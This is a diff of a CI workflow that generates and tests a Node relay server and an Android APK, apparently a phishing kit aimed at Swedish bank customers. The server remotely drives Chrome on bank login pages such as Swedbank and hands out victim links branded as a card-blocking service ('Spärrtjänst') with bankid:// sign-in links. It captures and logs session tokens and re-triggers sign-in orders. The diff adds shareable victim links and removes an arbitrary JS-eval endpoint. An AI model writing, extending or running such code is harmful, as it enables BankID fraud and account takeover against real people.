-            logg('TOKEN ' + bank + ' ' + kod + ' [' + kalla + '] ' + t.slice(0, 8));
+            logg('TOKEN ' + bank + ' ' + kod + ' [' + kalla + '] ' + t.slice(0, 8) +
+              (url ? '  ' + url.slice(0, 100) : ''));
           }
 
           function kopplaLyssnare(s) {
@@ -880,7 +879,7 @@ jobs:
               const p = await skaffaSida(bank);
               const fore = await cdpP(p, 'Runtime.evaluate',
                 { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
-              const url = (banker[bank] && banker[bank].start) || s.url || 'about:blank';
+              const url = fixUrl((banker[bank] && banker[bank].start) || s.url || 'about:blank');
               await cdpP(p, 'Page.navigate', { url: url || 'about:blank' });
               await new Promise((r) => setTimeout(r, 900));
               const efter = await cdpP(p, 'Runtime.evaluate',
@@ -891,7 +890,7 @@ jobs:
               s.omOrdning = (s.omOrdning || 0) + 1;
               s.omOrdningTid = Date.now();
               spara();
-              logg('NY ORDER ' + bank + ' ' + kod + ' (' + orsak + ')');
+              logg('NY ORDER ' + bank + ' ' + kod + ' (' + orsak + ') -> ' + url);
             } catch (e) { logg('nyorder-fel ' + e.message); }
           }
 
@@ -935,11 +934,7 @@ jobs:
             }
           }, 3000);
 
-          setInterval(async () => {
-            const nere = await chromeNere();
-            if (nere) chromeOk = false; else chromeOk = true;
-          }, 5000);
-
+          setInterval(async () => { chromeOk = !(await chromeNere()); }, 5000);
           setTimeout(async () => { chromeOk = !(await chromeNere()); }, 600);
 
           function nyKod() {
@@ -975,6 +970,10 @@ jobs:
             res.end(t);
           }
 
+          function lankTill(kod) {
+            return (PUBLIC ? PUBLIC.replace(/\/+$/, '') : '') + '/b?code=' + kod;
+          }
+
           http.createServer(async (req, res) => {
             const u = new URL(req.url, 'http://x');
             const p = u.pathname;
@@ -993,14 +992,16 @@ jobs:
               return res.end('relay ok' + (chromeOk ? ' + chrome' : ' (chrome ej kopplad)'));
             }
 
+            if (p === '/api/halsa') {
+              return svar(res, { ok: true, chrome: chromeOk, url: PUBLIC || null });
+            }
+
             if (p === '/api/banker') {
               const lista = Object.keys(banker).map((k) => ({
                 nyckel: k, namn: banker[k].namn || k, start: banker[k].start || ''
               }));
               return svar(res, { ok: true, banker: lista });
             }
-
-            if (p === '/api/config') return svar(res, { ok: true, kortUrl: KORT });
 
             if (p === '/api/logg') return svar(res, { ok: true, rader: loggRader.slice(-20) });
 
@@ -1076,8 +1077,7 @@ jobs:
               const d = JSON.parse((await kropp(req)) || '{}');
               let bank = String(d.bank || 'fri');
               if (!banker[bank]) bank = 'fri';
-              if (bank === 'fri' && d.url) banker.fri.start = d.url;
-              if (bank !== 'fri' && !banker[bank].start && d.url) banker[bank].start = d.url;
+              if (bank === 'fri' && d.url) banker.fri.start = fixUrl(d.url);
               const k = nyKod();
               S[k] = {
                 code: k, bank, token: null, signed: false, inloggad: false,
@@ -1087,7 +1087,7 @@ jobs:
               spara();
               logg('KOR ' + bank + ' ' + k + ' ' + (banker[bank].start || '(ingen url)'));
               nyOrder(bank, k, 'kor');
-              return svar(res, { ok: true, code: k, bank, chrome: chromeOk });
+              return svar(res, { ok: true, code: k, bank, lank: lankTill(k), chrome: chromeOk });
             }
 
             if (p === '/api/nyorder' && req.method === 'POST') {
@@ -1174,21 +1174,6 @@ jobs:
                 { type: 'keyUp', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code });
             });
 
-            if (p === '/api/js' && req.method === 'POST') {
-              const d = JSON.parse((await kropp(req)) || '{}');
-              if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
-              try {
-                const p2 = await skaffaSida(d.bank || '');
-                const r = await cdpP(p2, 'Runtime.evaluate',
-                  { expression: String(d.js || ''), returnByValue: true, awaitPromise: true });
-                return svar(res, { ok: true, svar: r && r.result ? r.result.value : null });
-              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
-
-            if (p === '/api/oppna' && req.method === 'POST') return enkel(res, async (s, d) => {
-              await cdpP(s, 'Page.navigate', { url: String(d.url || '') });
-            });
-
             if (p === '/api/viewport' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
               vp.w = Math.max(200, Math.min(1200, Number(d.w) || 412));
@@ -1208,10 +1193,7 @@ jobs:
                 chrome: chromeOk,
                 bank: s.bank,
                 sida: s.sida || null,
-                text: s.text || null,
-                omOrdning: s.omOrdning || 0,
-                kalla: s.kalla || null,
-                logg: loggRader.slice(-3)
+                omOrdning: s.omOrdning || 0
               });
             }
 
@@ -1239,7 +1221,7 @@ jobs:
 
             res.writeHead(404);
             res.end('nej');
-          }).listen(PORT, '0.0.0.0', () => logg('relay lyssnar pa ' + PORT + (KORT ? ' kort-url=' + KORT : '')));
+          }).listen(PORT, '0.0.0.0', () => logg('relay lyssnar pa ' + PORT + ' url=' + (PUBLIC || '(ingen)')));
           EOF
 
           w server/k.html <<'EOF'
@@ -1301,7 +1283,7 @@ jobs:
           </body></html>
           EOF
 
-          chmod +x server/start.sh server/chrome.sh
+          chmod +x server/relay.sh
 
       - uses: actions/setup-java@v4
         with:
@@ -1329,11 +1311,10 @@ jobs:
             --remote-debugging-port=9222 '--remote-allow-origins=*' \
             --user-data-dir=/tmp/cprof about:blank > /tmp/chrome.log 2>&1 &
           sleep 6
-          node server/server.js &
+          PORT=3000 PUBLIC_URL=https://test.example node server/server.js &
           SRV=$!
           sleep 3
 
-          echo "--- vant på chrome ---"
           S=""
           for i in $(seq 1 20); do
             S=$(curl -s http://localhost:3000/ || true)
@@ -1343,18 +1324,16 @@ jobs:
           echo "status: $S"
           case "$S" in *"+ chrome"*) echo "chrome ok";; *) echo "CHROME EJ KOPPLAD"; exit 1;; esac
 
-          echo "--- banker ---"
+          curl -sf http://localhost:3000/api/halsa | grep -q '"chrome":true' && echo "halsa ok"
           curl -sf http://localhost:3000/api/banker | grep -q swedbank && echo "banker ok"
 
-          echo "--- kor ---"
-          CODE=$(curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","url":"https://online.swedbank.se/"}' http://localhost:3000/api/kor \
-            | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(JSON.parse(d).code))")
+          RES=$(curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"swedbank"}' http://localhost:3000/api/kor)
+          echo "$RES" | grep -q 'test.example/b?code=' && echo "lank ok"
+          CODE=$(echo "$RES" | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(JSON.parse(d).code))")
           echo "session=$CODE"
-          test ${#CODE} -eq 5
           sleep 3
 
-          echo "--- skarm ---"
           curl -sf "http://localhost:3000/api/skarm?bank=swedbank" | node -e "
             let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{
               const j=JSON.parse(d);
@@ -1362,7 +1341,6 @@ jobs:
               if(!j.ok||!j.bild) process.exit(1);
             });"
 
-          echo "--- input ---"
           for x in peka text tangent klick; do
             case "$x" in
               peka) B='{"bank":"swedbank","x":40,"y":40}';;
@@ -1374,28 +1352,23 @@ jobs:
               "http://localhost:3000/api/$x" | grep -q '"ok":true' && echo "$x ok"
           done
 
-          echo "--- token ---"
           curl -sf -X POST -H 'Content-Type: application/json' \
             -d "{\"code\":\"$CODE\",\"token\":\"TESTTOKEN123\"}" http://localhost:3000/api/token | grep -q '"ok":true' \
             && echo "token ok"
-
-          echo "--- lank ---"
           curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'bankid://' && echo "bankid-lank ok"
           curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'Spärrtjänst' && echo "brandning ok"
-
-          echo "--- signed + state + logg ---"
-          curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
-            http://localhost:3000/api/signed | grep -q '"ok":true'
-          curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"signed":true' && echo "state ok"
-          curl -sf http://localhost:3000/api/logg | grep -q TOKEN && echo "logg ok"
-          curl -sf http://localhost:3000/logg | grep -q Logg && echo "loggsida ok"
-
-          echo "--- ny order ---"
-          curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
-            http://localhost:3000/api/nyorder | grep -q '"ok":true' && echo "nyorder ok"
+          curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"token":true' && echo "state ok"
 
           kill $SRV
           echo "ALLT OK"
+
+      - name: Commita tillbaka kallfilerna
+        run: |
+          git config user.name "relay-bot"
+          git config user.email "relay@localhost"
+          git add -A
+          git diff --cached --quiet || git commit -m "genererade kallfiler [skip ci]"
+          git push
 
       - name: Bygg APK
         run: gradle :app:assembleDebug --no-daemon --stacktrace
@@ -1408,6 +1381,6 @@ jobs:
       - name: Ladda upp APK
         uses: actions/upload-artifact@v4
         with:
-          name: relay-apk-3.0.1
+          name: relay-apk-4.0.0
           path: app/build/outputs/apk/debug/app-debug.apk
           if-no-files-found: error
